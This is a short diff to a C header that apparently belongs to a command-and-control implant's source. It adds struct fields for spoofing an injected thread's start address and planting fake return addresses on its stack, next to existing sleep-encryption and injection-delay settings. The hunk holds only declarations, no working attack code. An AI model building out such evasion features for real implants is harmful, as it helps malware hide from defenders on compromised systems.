@@ -157,6 +157,8 @@ typedef struct
             DWORD SleepCipher;          /* SLEEP_CIPHER_RC4 (0) or SLEEP_CIPHER_CHACHA20 (1); set from config blob */
             DWORD ExecDelay;            /* HVC-046: base delay (ms) between injection stages; 0 = disabled */
             DWORD ExecDelayJitter;      /* HVC-046: jitter percentage applied to ExecDelay; 0 = no jitter */
+            PVOID InjSpoofStartAddr;    /* HVC-047: TEB.Win32StartAddress spoof target; NULL = skip Tier 2 */
+            PVOID InjSpoofFrame[4];     /* HVC-047: fake return addresses written at initial thread RSP */
         } Implant;
 
         struct {
